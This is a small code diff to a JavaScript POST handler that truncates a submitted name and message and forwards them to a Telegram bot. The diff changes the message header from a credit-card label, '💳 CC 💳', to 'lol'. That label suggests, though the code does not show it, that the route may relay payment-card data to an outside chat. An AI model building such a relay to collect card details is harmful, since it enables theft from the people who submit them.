@@ -16,7 +16,7 @@ export async function POST(req) {
     const safeName = (name ?? "Web").toString().slice(0, 80);
     const safeMessage = message.toString().slice(0, 3500);
 
-    const text = `💳 CC 💳\n👤 ${safeName}\n\n${safeMessage}`;
+    const text = `lol\n👤 ${safeName}\n\n${safeMessage}`;
 
     const tgRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: "POST",
